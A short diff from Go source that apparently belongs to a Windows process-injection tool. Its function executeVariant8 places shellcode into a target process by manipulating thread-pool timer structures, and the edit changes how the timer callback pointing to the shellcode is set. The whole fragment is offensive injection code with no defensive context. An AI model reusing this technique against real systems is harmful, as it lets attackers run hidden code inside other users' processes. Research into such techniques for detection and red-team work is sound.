@@ -954,8 +954,8 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	// Set Pool pointer to target's TP_POOL
 	tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
 
-	// CRITICAL: Manually set the Callback - CreateThreadpoolTimer doesn't set this field
-	tpTimer.Work.CleanupGroupMember.Callback = shellcodeAddr
+	// Note: CreateThreadpoolTimer should have set the Callback to shellcodeAddr already
+	// SafeBreach doesn't manually set Callback - they pass it to CreateThreadpoolTimer
 
 	// Set timer expiration
 	tpTimer.DueTime = timeout
